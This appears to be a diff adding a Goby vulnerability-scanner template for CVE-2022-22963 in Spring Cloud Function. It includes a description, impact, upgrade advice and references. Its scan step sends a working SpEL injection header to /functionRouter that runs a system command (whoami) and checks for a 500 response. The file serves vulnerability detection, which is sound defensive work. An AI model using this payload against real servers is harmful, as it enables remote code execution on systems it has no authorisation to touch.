@@ -1,0 +1,75 @@
+{
+      "Name": "Spring Cloud Function SpEL RCE CVE-2022-22963",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "app=\"springboot\" || body=\"Whitelabel Error Page\"",
+      "Description": "Spring Cloud Function is a project with the following high-level goals:\nPromote the implementation of business logic via functions.\nDecouple the development lifecycle of business logic from any specific runtime target so that the same code can run as a web endpoint, a stream processor, or a task.\nSupport a uniform programming model across serverless providers, as well as the ability to run standalone (locally or in a PaaS).\nEnable Spring Boot features (auto-configuration, dependency injection, metrics) on serverless providers.\nIt abstracts away all of the transport details and infrastructure, allowing the developer to keep all the familiar tools and processes, and focus firmly on business logic.",
+      "Product": "Spring Cloud Function",
+      "Homepage": "https://spring.io/projects/spring-cloud-function",
+      "Author": "",
+      "Impact": "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources.",
+      "Recommendation": "Users of affected versions should upgrade to 3.1.7, 3.2.3.",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-22963",
+            "https://tanzu.vmware.com/security/cve-2022-22963"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/functionRouter",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"whoami\")",
+                              "Content-Type": "text/plain"
+                        },
+                        "data_type": "text",
+                        "data": "test",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Internal Server Error",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "functionRouter",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
